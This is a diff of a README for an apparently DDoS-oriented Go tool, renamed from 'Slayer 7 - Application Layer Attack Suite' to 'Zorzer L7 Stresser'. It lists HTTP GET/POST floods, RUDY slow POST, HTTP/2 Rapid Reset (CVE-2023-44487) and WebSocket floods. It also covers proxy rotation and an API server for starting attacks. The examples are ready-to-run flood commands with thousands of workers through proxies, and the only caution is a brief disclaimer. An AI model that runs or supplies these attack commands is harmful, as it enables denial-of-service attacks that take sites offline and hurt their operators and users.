@@ -1,14 +1,11 @@
+# Zorzer L7 Stresser
 
-# ⚔️ Slayer 7 - Application Layer Attack Suite
-
-> A high-performance, multi-method HTTP/S stress testing tool written in **Go**.
-Supports both HTTP and HTTPS, multiple attack vectors, proxy rotation, and massive concurrent worker pools.
+A high-performance, multi-method HTTP/S stress testing tool written in **Go**.
+Supports HTTP and HTTPS, multiple attack vectors, proxy rotation, and massive concurrent worker pools.
 
 ---
-> HTTP/2 Rapid-Reset Exploit 1M+ RPS
-![Animation](https://github.com/user-attachments/assets/f33cb033-dfb6-4101-bdb5-507f2e5ad83e)
 
-##  Methods
+## Methods
 
 | Method       | Description                                                  |
 | ------------ | ------------------------------------------------------------ |
@@ -19,29 +16,29 @@ Supports both HTTP and HTTPS, multiple attack vectors, proxy rotation, and massi
 | `rapidreset` | HTTP/2 Rapid Reset (CVE-2023-44487)                          |
 | `wsflood`    | WebSocket connection flood with mixed traffic                |
 
-##  Installation
+---
+
+## Installation
 
 ### Prerequisites
 
-* **Go 1.21+**
+* **Go 1.25+**
 
-### Quick Setup
+### Setup
 
 ```bash
-git clone https://github.com/Syn2Much/Slayer-L7.git
-cd Slayer-L7
-go mod tidy
-go build -o slayer .
+bash setup.sh
 ```
+
 ---
 
-##  Usage
+## Usage
+
+### CLI
 
 ```bash
-slayer -t <url> [-m method] [-w workers] [-d duration] [-p proxyfile] [-v] [-r ms]
+zorzer -t <url> [-m method] [-w workers] [-d duration] [-p proxyfile] [-v] [-r ms]
 ```
-
-### Flags
 
 | Flag | Default      | Description                             |
 | ---- | ------------ | --------------------------------------- |
@@ -49,71 +46,85 @@ slayer -t <url> [-m method] [-w workers] [-d duration] [-p proxyfile] [-v] [-r m
 | `-m` | `httpget`    | Attack method                           |
 | `-w` | `2048`       | Number of concurrent workers            |
 | `-d` | `30`         | Duration (seconds)                      |
-| `-p` | *(none)*     | Proxy file path (omit for direct mode)  |
+| `-p` | *(none)*     | Proxy file path                         |
 | `-v` | `false`      | Print request errors to stderr          |
-| `-r` | `0`          | Delay in ms between requests per worker (0 = unlimited) |
+| `-r` | `0`          | Delay in ms between requests per worker |
 
----
-
-
----
-### Dependencies
-
-```
-github.com/gorilla/websocket
-golang.org/x/net/http2
-golang.org/x/net/http2/hpack
-```
-
-##  Examples
+### API Server
 
 ```bash
-# Basic GET flood (60s)
-./slayer -t https://target.com -m httpget -d 60
+zorzer -api
+zorzer -api -api-port 9000
+```
 
-# POST flood via proxies (4096 workers)
-./slayer -t https://target.com -m httppost -w 4096 -d 120 -p proxies.txt
+| Method | Endpoint              | Description        |
+| ------ | --------------------- | ------------------ |
+| POST   | `/api/attack/start`   | Start an attack    |
+| POST   | `/api/attack/stop`    | Stop current attack|
+| GET    | `/api/attack/status`  | Live stats         |
+| GET    | `/api/health`         | Health check       |
 
-# RUDY slow POST
-./slayer -t https://target.com -m rudy -w 500 -d 300
+**Start attack (JSON body):**
 
-# HTTP/2 Rapid Reset via proxies
-./slayer -t https://target.com -m rapidreset -w 1024 -p proxies.txt
-
-# WebSocket flood
-./slayer -t https://target.com -m wsflood -w 2048 -d 60
-
-# API JSON flood
-./slayer -t https://target.com -m apiflood -w 2048 -d 90
-
-# Rate-limited GET flood (max ~100 RPS across 10 workers)
-./slayer -t https://target.com -m httpget -w 10 -d 60 -r 100
-
-# Verbose mode — print errors to stderr while running
-./slayer -t https://target.com -m httpget -d 30 -v
+```json
+{
+  "target":   "https://example.com",
+  "method":   "httpget",
+  "workers":  2048,
+  "duration": 60
+}
 ```
 
 ---
 
-##  Proxy File Format
+## Examples
 
-One proxy per line.
-Supports HTTP / HTTPS / SOCKS5 with optional authentication.
+```bash
+# GET flood (60s)
+./zorzer -t https://target.com -m httpget -d 60
+
+# POST flood via proxies (4096 workers)
+./zorzer -t https://target.com -m httppost -w 4096 -d 120 -p proxies.txt
+
+# HTTP/2 Rapid Reset
+./zorzer -t https://target.com -m rapidreset -w 1024 -p proxies.txt
+
+# WebSocket flood
+./zorzer -t https://target.com -m wsflood -w 2048 -d 60
+
+# API server mode
+./zorzer -api
+```
+
+---
+
+## Proxy File Format
+
+One proxy per line. Supports HTTP / HTTPS / SOCKS5 with optional authentication.
 
 ```
 http://proxy1.example.com:8080
 http://user:pass@proxy2.example.com:3128
 socks5://proxy3.example.com:1080
 ```
+
 ---
+
+## Configuration
+
+All defaults and credentials live in `config.json`:
+
+```json
+{
+  "supabase": { "url": "...", "service_key": "..." },
+  "api":      { "port": 8080 },
+  "defaults": { "method": "httpget", "workers": 2048, "duration": 30 }
+}
+```
+
+---
+
 > **⚠️ Disclaimer**
 > This tool is intended **only** for authorized security testing and research.
 > Use **only** against systems you own or have **explicit written permission** to test.
 > Unauthorized use is illegal.
- 
-## 👤 Author
-
-**Syn2Much**
-
-[![Email](https://img.shields.io/badge/Email-hell%40sinnners.city-red?style=flat-square&logo=gmail)](mailto:hell@sinnners.city)
-[![X](https://img.shields.io/badge/@synacket-black?style=flat-square&logo=x)](https://x.com/synacket)
